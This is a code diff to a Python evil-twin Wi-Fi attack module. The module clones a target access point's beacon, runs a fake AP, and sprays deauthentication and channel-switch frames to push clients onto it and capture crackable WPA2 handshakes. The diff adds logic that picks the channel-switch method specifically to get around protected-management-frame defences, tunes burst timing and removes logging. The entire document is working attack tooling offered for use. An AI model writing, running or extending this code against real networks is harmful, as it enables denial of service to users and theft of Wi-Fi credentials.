@@ -22,7 +22,7 @@ _BROADCAST = b"\xff\xff\xff\xff\xff\xff"
 _BURST_SIZE = 64
 _FRAME_GAP_SEC = 0.002
 _POLL_SEC = 0.25
-_CSA_RETURN_SEC = 2.0
+_CSA_RETURN_SEC = 0.5
 _DEAUTH_REASON = 7                               # class-3 frame from a nonassociated STA
 
 
@@ -31,6 +31,24 @@ class PuntMode(enum.Enum):
     DEAUTH = "deauth"
     BOTH = "both"
     NONE = "none"
+
+
+def csa_target_channel(ap_channel: int) -> int:
+    """A valid decoy channel in the AP's own band that it isn't on, so a honoring client leaves it."""
+    if ap_channel > 14:                       # 5GHz
+        return 40 if ap_channel == 36 else 36
+    return 6 if ap_channel == 1 else 1
+
+
+def default_punt_mode(ap) -> PuntMode:
+    """The punt mode for a target's PMF posture (EVILTWIN.md §5): PMF-Required clients ignore
+    deauth so only CSA herds them; PMF-Disabled take a plain deauth; Optional gets both (the
+    protected and unprotected client populations are disjoint)."""
+    if ap.pmf_required:
+        return PuntMode.CSA
+    if ap.pmf_capable:
+        return PuntMode.BOTH
+    return PuntMode.DEAUTH
 
 
 @dataclass(frozen=True)
@@ -56,18 +74,19 @@ class EvilTwinCampaign(Campaign):
         return bool(ap.ssid) and bool(ap.akm_suites)
 
     @classmethod
-    def ineligible_reason(cls, ap) -> Optional[str]:
+    def ineligible_reason(cls, ap, num_ifaces: Optional[int] = None) -> Optional[str]:
+        if num_ifaces is not None and num_ifaces < 2:
+            return "Requires 2 or more wireless interfaces"
         if not ap.last_beacon_frame:
             return "no beacon captured yet"
         return None
 
-    def __init__(self, array, target, evil_input: EvilTwinInput, log=None):
+    def __init__(self, array, target, evil_input: EvilTwinInput):
         if not target.last_beacon_frame:
             raise ValueError("EvilTwin needs a captured beacon to clone; none seen yet.")
         if not target.ssid:
             raise ValueError("EvilTwin needs a known SSID: target is hidden.")
         super().__init__(ap=target, array=array)
-        self.log = log or (lambda _m: None)
         self.ssid = target.ssid
         self.bssid = target.bssid
         self.bssid_bytes = str_to_mac(target.bssid)
@@ -87,17 +106,17 @@ class EvilTwinCampaign(Campaign):
                              self.twin_beacon, rx_source=self.twin_iface,
                              record_m1=self.array.record_injected_eapol)
         await self.fakeap.start()
-        self.log(f"EvilTwin up on CH {self.twin_channel} (target CH {self.target_channel})")
 
         frames = self._punt_frames()
         if frames and self.punt_iface.current_channel != self.target_channel:
             await self.punt_iface.set_channel(self.target_channel)
 
-        while not self.stopped and not self._is_captured():
+        while not self.stopped:
+            if self._has_crackable_capture():
+                self.captured = True
+                break
             await self._punt_burst(frames)
             await self._sleep_between_bursts(self.punt_period_sec)
-        if self._is_captured():
-            self.log("crackable handshake captured; stopping")
 
     def _punt_frames(self) -> list[bytes]:
         """The CSA and/or deauth frames to spray each burst, per punt_mode."""
@@ -117,24 +136,24 @@ class EvilTwinCampaign(Campaign):
     async def _sleep_between_bursts(self, seconds: float) -> None:
         """Sleep up to `seconds`, waking early on stop or a capture."""
         elapsed = 0.0
-        while elapsed < seconds and not self.stopped and not self._is_captured():
+        while elapsed < seconds and not self.stopped and not self._has_crackable_capture():
             await asyncio.sleep(_POLL_SEC)
             elapsed += _POLL_SEC
 
-    def _is_captured(self) -> bool:
+    def _has_crackable_capture(self) -> bool:
         ap = self.array.access_points.get(self.bssid)
-        if ap is not None and any(crackable_pairs(hs) for hs in ap.handshakes.values()):
-            self.captured = True
-        return self.captured
+        if ap is None:
+            return False
+        return any(crackable_pairs(hs) for hs in ap.handshakes.values())
 
     async def teardown(self) -> None:
         if self.fakeap is None:
             return
         try:
-            await self._csa_return()
+            await self.fakeap.stop()      # stop the WPA2 beacon + responder first
+            await self._csa_return()      # then announce the switch-back, uninterleaved
         finally:
-            await self.fakeap.stop()
-        self.log("EvilTwin stopped")
+            await self.twin_iface.set_channel(self.target_channel)   # un-strand the twin card
 
     async def _csa_return(self) -> None:
         """CSA the twin-channel clients back to the target's channel."""
